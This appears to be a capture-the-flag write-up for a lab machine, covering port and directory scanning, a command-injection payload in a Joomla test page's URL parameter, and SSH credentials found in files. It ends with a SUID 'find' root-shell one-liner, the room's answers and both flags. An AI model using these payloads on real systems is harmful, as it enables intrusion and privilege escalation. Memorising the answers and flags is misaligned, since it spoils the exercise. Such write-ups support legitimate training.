## Target: 10.66.188.172 > target.thm
### Recon
- Nmap:
	- `nmap -p- target.thm`
	- `nmap -A -p 21,80,10000,55007 target.thm -oA nmap`
### Enumeration
- Open Ports:
	- **21**/tcp, **ftp**, vsftpd 3.0.3
	- **80**/tcp, **http**, Apache httpd 2.4.18 ((Ubuntu))
	- **10000**/tcp, **http**, MiniServ 1.930 (Webmin httpd)
	- **55007**/tcp, **ssh**, OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- Findings:
	- Anonymous ftp login detected. In the folder we find a hidden file called `.info.txt` which contains some jumbled text which looks like the Caesar Cypher. I noticed one word that I had a hunch was "Lol", and sure enough, each letter is shifted 13 spaces right.
		`Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!`
		`Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`
	- When we visit `http://target.thm:10000` we land on a page directing us to `https://ip-10-66-188-172.ec2.internal:10000/`. This is a Webmin login page. Common default creds do not work. However, we do read that the default Webmin username is often _root_, and that the password is often the system's root user password.
		- Couldn't find any exploits for the version of Webmin that we are dealing with.
	- A gobuster run reveals a Joomla CMS directory, and a subsequent run on the /joomla directory reveals an administrator directory with a Joomla login form.
		`gobuster dir -u http://target.thm -w /usr/share/wordlists/dirb/common.txt -o gobust`
		`gobuster dir -u http://target.thm/joomla -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
	- We also find pages called "test" and "files" (underscore before the words), with test having a file upload feature.
		- On the files page we have a double-encoded base64 string that decodes from _VjJodmNITnBaU0JrWVdsemVRbz0K_ to _Whopsie daisy_. Not much help.

**File extension after anon login**
txt
**What is on the highest port?**
ssh
**What's running on port 10000?**
webmin
**Can you exploit the service running on that port? (yay/nay answer)**
nay
**What's CMS can you access?**
Joomla
**The interesting file name in the folder?**
log.txt
### Vulnerabilities
- We find a URL parameter that is vulnerable to command injection on the test page. 
### Exploitation
- We try `http://target.thm/joomla/_test/index.php?plot=;id` and then `http://target.thm/joomla/_test/index.php?plot=;ls` and then `http://target.thm/joomla/_test/index.php?plot=;cat log.txt` where we find come ssh credentials: _basterd:superduperp@SS (s's are $'s)_
- We log in via ssh with those credentials and on port 55007 and we're in. 

### Post Exploitation
- In the `backup.sh` file in basterd's home directory we find more credentials: _stoner:superduperp@SSno1knows_ (again, $'s for thee S's)
- We log in to stoner's profile and find a hidden file called .secret. More taunting: _"You made it till here, well done."_ Wait, that is actually the user flag!
### Privilege Escalation
- To elevate our privileges, we run `find / -perm -u=s -type f 2>/dev/null` and discover that /usr/bin/find has the SUID bit set. 
- A quick peek at GTFOBins and we find a command to elevate our privileges: `/usr/bin/find . -exec /bin/sh -p \; -quit`
- Root! We grab the final flag and go drink a beer.
### Flags
- User: _You made it till here, well done._
- Root: _It wasn't that hard, was it?_
### Notes
- Be more thorough in enumeration. You were 90% of the way to discovering something without getting help multiple times during this machine.